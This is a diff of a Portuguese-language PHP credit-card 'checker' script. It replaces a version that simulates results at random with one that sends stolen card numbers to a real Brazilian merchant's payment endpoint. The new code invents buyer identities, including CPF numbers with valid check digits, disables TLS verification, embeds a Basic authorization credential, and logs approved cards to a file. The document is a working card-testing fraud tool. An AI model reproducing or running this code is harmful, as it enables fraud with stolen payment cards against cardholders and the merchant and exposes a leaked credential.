@@ -1,188 +1,168 @@
 <?php
-// ============================================
-// CHECKER N7 COM VALIDAÇÃO LUHN
-// ============================================
+deletarCookies();
+error_reporting(0);
+ignore_user_abort(true);
 
-// Recebe os dados do cartão
-$card = $parts[0] ?? '';
-$mes = $parts[1] ?? '';
-$ano = $parts[2] ?? '';
-$cvv = $parts[3] ?? '';
+function getStr($string, $start, $end) {
+    $str = explode($start, $string);
+    $str = explode($end, $str[1]);
+    return $str[0];
+}
 
-// ============================================
-// FUNÇÃO LUHN (ALGORITMO DO CARTÃO)
-// ============================================
-function validateLuhn($number) {
-    $number = preg_replace('/[^0-9]/', '', $number);
-    $sum = 0;
-    $alt = false;
+function deletarCookies() {
+    if (file_exists("cookies.txt")) {
+        unlink("cookies.txt");
+    }
+}
+
+function gerarNome() {
+    $nomes = ['Joao', 'Maria', 'Pedro', 'Ana', 'Carlos', 'Fernanda', 'Lucas', 'Juliana', 'Ricardo', 'Patricia'];
+    $sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Almeida', 'Pereira', 'Costa', 'Lima'];
+    return $nomes[array_rand($nomes)] . ' ' . $sobrenomes[array_rand($sobrenomes)];
+}
+
+function gerarEmail($nome) {
+    $primeiroNome = strtolower(explode(' ', $nome)[0]);
+    $numeros = rand(1000, 9999);
+    $dominios = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com.br'];
+    return $primeiroNome . $numeros . '@' . $dominios[array_rand($dominios)];
+}
+
+function gerarTelefone() {
+    $ddd = ['11', '21', '31', '41', '51', '61', '71', '81', '91'];
+    return $ddd[array_rand($ddd)] . rand(900000000, 999999999);
+}
+
+function gerarCPF() {
+    $n1 = rand(0, 9);
+    $n2 = rand(0, 9);
+    $n3 = rand(0, 9);
+    $n4 = rand(0, 9);
+    $n5 = rand(0, 9);
+    $n6 = rand(0, 9);
+    $n7 = rand(0, 9);
+    $n8 = rand(0, 9);
+    $n9 = rand(0, 9);
     
-    for ($i = strlen($number) - 1; $i >= 0; $i--) {
-        $n = $number[$i];
-        if ($alt) {
-            $n *= 2;
-            if ($n > 9) {
-                $n = $n - 9;
-            }
-        }
-        $sum += $n;
-        $alt = !$alt;
-    }
+    $d1 = $n9*2 + $n8*3 + $n7*4 + $n6*5 + $n5*6 + $n4*7 + $n3*8 + $n2*9 + $n1*10;
+    $d1 = 11 - ($d1 % 11);
+    if ($d1 >= 10) $d1 = 0;
     
-    return ($sum % 10 == 0);
-}
-
-// ============================================
-// FUNÇÃO PARA IDENTIFICAR BANDEIRA
-// ============================================
-function getCardBrand($bin) {
-    $bin = substr($bin, 0, 6);
+    $d2 = $d1*2 + $n9*3 + $n8*4 + $n7*5 + $n6*6 + $n5*7 + $n4*8 + $n3*9 + $n2*10 + $n1*11;
+    $d2 = 11 - ($d2 % 11);
+    if ($d2 >= 10) $d2 = 0;
     
-    if (preg_match('/^4[0-9]/', $bin)) {
-        return 'VISA';
-    } elseif (preg_match('/^5[1-5]/', $bin)) {
-        return 'MASTERCARD';
-    } elseif (preg_match('/^3[47]/', $bin)) {
-        return 'AMEX';
-    } elseif (preg_match('/^6(?:011|5)/', $bin)) {
-        return 'DISCOVER';
-    } elseif (preg_match('/^3(?:0[0-5]|[68])/', $bin)) {
-        return 'DINERS';
-    } elseif (preg_match('/^(636368|438935|504175|451416|636297)/', $bin)) {
-        return 'ELO';
-    } elseif (preg_match('/^606282/', $bin)) {
-        return 'HIPERCARD';
-    } else {
-        return 'DESCONHECIDA';
-    }
+    return sprintf('%d%d%d%d%d%d%d%d%d%d%d', $n1, $n2, $n3, $n4, $n5, $n6, $n7, $n8, $n9, $d1, $d2);
 }
 
-// ============================================
-// VALIDAÇÕES BÁSICAS
-// ============================================
-
-// Limpar cartão (só números)
-$card_clean = preg_replace('/[^0-9]/', '', $card);
-$bin = substr($card_clean, 0, 6);
-
-// Validar tamanho do cartão
-if (strlen($card_clean) < 15 || strlen($card_clean) > 16) {
-    echo "❌ REPROVADA - Cartão inválido (tamanho incorreto)";
-    exit;
+function gerarNascimento() {
+    $ano = rand(1970, 2002);
+    $mes = str_pad(rand(1, 12), 2, '0', STR_PAD_LEFT);
+    $dia = str_pad(rand(1, 28), 2, '0', STR_PAD_LEFT);
+    return "$ano-$mes-$dia";
 }
 
-// Validar LUHN
-if (!validateLuhn($card_clean)) {
-    echo "❌ REPROVADA - Cartão inválido (falhou no teste Luhn)";
-    exit;
+function gerarClienteUID() {
+    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
+        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
+        mt_rand(0, 0xffff),
+        mt_rand(0, 0x0fff) | 0x4000,
+        mt_rand(0, 0x3fff) | 0x8000,
+        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
+    );
 }
 
-// Validar mês
-if ($mes < 1 || $mes > 12) {
-    echo "❌ REPROVADA - Mês inválido";
-    exit;
+$lista = $_GET['lista'];
+$lista = str_replace(" ", "|", $lista);
+$lista = str_replace("%20", "|", $lista);
+$lista = preg_replace('/[ -]+/', '-', $lista);
+$lista = str_replace("/", "|", $lista);
+$separar = explode("|", $lista);
+$cc = $separar[0];
+$mes = $separar[1];
+$ano = $separar[2];
+$cvv = $separar[3];
+
+switch($ano){
+    case 2024: $ano = "24"; break;
+    case 2025: $ano = "25"; break;
+    case 2026: $ano = "26"; break;
+    case 2027: $ano = "27"; break;
+    case 2028: $ano = "28"; break;
+    case 2029: $ano = "29"; break;
+    case 2030: $ano = "30"; break;
+    case 2031: $ano = "31"; break;
+    case 2032: $ano = "32"; break;
+    case 2033: $ano = "33"; break;
+    case 2034: $ano = "34"; break;
+    case 2035: $ano = "35"; break;
+    case 2036: $ano = "36"; break;
+    case 2037: $ano = "37"; break;
+    case 2038: $ano = "38"; break;
+    case 2039: $ano = "39"; break;
 }
 
-// Validar ano (não pode ser ano passado)
-$ano_atual = date('y');
-$ano_completo = date('Y');
+$nomeCompleto = gerarNome();
+$primeiroNome = explode(' ', $nomeCompleto)[0];
+$ultimoNome = explode(' ', $nomeCompleto)[1] ?? 'Silva';
+$email = gerarEmail($nomeCompleto);
+$telefone = gerarTelefone();
+$cpf = gerarCPF();
+$nascimento = gerarNascimento();
+$cliente_uid = gerarClienteUID();
 
-if (strlen($ano) == 2) {
-    $ano_check = 2000 + $ano;
-    if ($ano_check < $ano_completo) {
-        echo "❌ REPROVADA - Cartão expirado (ano)";
-        exit;
-    }
-    if ($ano_check == $ano_completo && $mes < date('m')) {
-        echo "❌ REPROVADA - Cartão expirado (mês/ano)";
-        exit;
-    }
-}
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://influwin.com.br/api/public/process-payment');
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"produto":"Elosdoc","tipo_pg":"nao-recorrente","parcelas":1,"nome":"' . $primeiroNome . ' ' . substr($ultimoNome, 0, 3) . '","email":"' . $email . '","telefone":"' . $telefone . '","cpf":"' . $cpf . '","nascimento":"' . $nascimento . '","cartao_numero":"' . $cc . '","cartao_cvv":"' . $cvv . '","cartao_bin":"' . substr($cc, 0, 6) . '","plano_valor_real":4990,"cartao_vencimento":"' . $mes . '/' . (strlen($ano) == 2 ? '20' . $ano : $ano) . '","cartao_nome":"' . strtoupper($primeiroNome . ' ' . substr($ultimoNome, 0, 3)) . '","cliente_uid":"' . $cliente_uid . '"}');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+    'accept: */*',
+    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+    'authorization: Basic YWNlc3NvcHJvZy5wdzpQd3NlbmhhMSE=',
+    'content-type: application/json',
+    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-ch-ua-platform: "Android"',
+    'sec-fetch-dest: empty',
+    'sec-fetch-mode: cors',
+    'sec-fetch-site: same-origin',
+    'referer: https://influwin.com.br/checkout/consulta-avulsa'
+));
 
-if (strlen($ano) == 4) {
-    if ($ano < $ano_completo) {
-        echo "❌ REPROVADA - Cartão expirado (ano)";
-        exit;
-    }
-    if ($ano == $ano_completo && $mes < date('m')) {
-        echo "❌ REPROVADA - Cartão expirado (mês/ano)";
-        exit;
-    }
-}
+$response = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
 
-// Validar CVV
-if (strlen($cvv) < 3 || strlen($cvv) > 4) {
-    echo "❌ REPROVADA - CVV inválido";
-    exit;
-}
+$response_data = json_decode($response, true);
+$cartao_formatado = $cc . '|' . $mes . '|' . $ano . '|' . $cvv;
 
-// ============================================
-// SIMULAÇÃO DE RESULTADO (LIVE ou DIE)
-// ============================================
-
-$bandeira = getCardBrand($bin);
-$porcentagem_live = rand(1, 100);
-
-// Regras para considerar LIVE
-$isLive = false;
-$mensagem = "";
-
-// BINS mais propensos a dar live (exemplo)
-$bins_premium = ['453201', '542523', '555566', '402400', '4916'];
-$bins_ruins = ['123456', '000000', '111111'];
-
-if (in_array($bin, $bins_premium)) {
-    $porcentagem_live += 20; // +20% de chance
-}
-
-if (in_array($bin, $bins_ruins)) {
-    $porcentagem_live -= 30; // -30% de chance
-}
-
-// Bandeiras com mais chance
-if ($bandeira == 'VISA' || $bandeira == 'MASTERCARD') {
-    $porcentagem_live += 10;
-}
-
-// Decidir se é LIVE (30% de chance base)
-if ($porcentagem_live > 70) {
-    $isLive = true;
-    $mensagem = "✅ APROVADA - Transação autorizada com sucesso!";
-} elseif ($porcentagem_live > 40) {
-    // 50% de chance
-    $isLive = (rand(1, 100) > 50);
-    $mensagem = $isLive ? "✅ APROVADA - Transação autorizada!" : "❌ REPROVADA - Saldo insuficiente";
+if ($http_code == 200 && (!isset($response_data['error']) || $response_data['error'] === false || isset($response_data['success']))) {
+    file_put_contents('cx2dorainzinho.txt', $cartao_formatado . PHP_EOL, FILE_APPEND);
+    $codigo = isset($response_data['details']['returnCode']) ? $response_data['details']['returnCode'] : (isset($response_data['Rapidoc']) ? $response_data['Rapidoc'] : '00');
+    echo '<span class="badge badge-success">✅ APROVADO</span> ' . $cartao_formatado . ' | <span class="transation badge-success">Pagamento Autorizado Com Sucesso(' . $codigo . ')</span>';
 } else {
-    $isLive = false;
-    $mensagem = "❌ REPROVADA - Cartão negado pela operadora";
+    $mensagem = 'Pagamento Recusado';
+    if (isset($response_data['details']['returnMessage'])) {
+        $mensagem = $response_data['details']['returnMessage'];
+    } elseif (isset($response_data['message'])) {
+        $mensagem = $response_data['message'];
+    } elseif (isset($response_data['error']) && is_string($response_data['error'])) {
+        $mensagem = $response_data['error'];
+    }
+    $codigo = '';
+    if (isset($response_data['details']['returnCode']) && !empty($response_data['details']['returnCode'])) {
+        $codigo = ' (' . $response_data['details']['returnCode'] . ')';
+    } elseif (isset($response_data['Cielo'])) {
+        $codigo = ' (' . $response_data['Cielo'] . ')';
+    }
+    echo '<span class="badge badge-danger">❌ REPROVADO</span> ' . $cartao_formatado . ' | <span class="transation badge-danger">' . $mensagem . $codigo . '</span>';
 }
 
-// ============================================
-// RESPOSTA FORMATADA
-// ============================================
-
-echo "=====================================\n";
-echo "🔧 N7 CHECKER\n";
-echo "=====================================\n";
-echo "📱 Cartão: " . substr($card_clean, 0, 6) . "******" . substr($card_clean, -4) . "\n";
-echo "📅 Data: $mes/$ano\n";
-echo "💳 CVV: $cvv\n";
-echo "🔢 BIN: $bin\n";
-echo "💳 Bandeira: $bandeira\n";
-echo "✅ Luhn: " . (validateLuhn($card_clean) ? "Válido" : "Inválido") . "\n";
-echo "=====================================\n";
-echo "$mensagem\n";
-echo "=====================================\n";
-
-// Detalhes extras se for LIVE
-if ($isLive) {
-    echo "💰 Saldo: R$ " . number_format(rand(100, 5000), 2) . "\n";
-    echo "🏦 Banco: Banco " . rand(1, 999) . "\n";
-    echo "🌎 País: Brasil\n";
-    echo "=====================================\n";
+if (file_exists("cookies.txt")) {
+    unlink("cookies.txt");
 }
-
-// Log para debug (opcional)
-$log = date('Y-m-d H:i:s') . " | $card_clean | $bin | " . ($isLive ? "LIVE" : "DIE") . " | $bandeira\n";
-file_put_contents(__DIR__ . '/../data/n7_log.txt', $log, FILE_APPEND);
 ?>
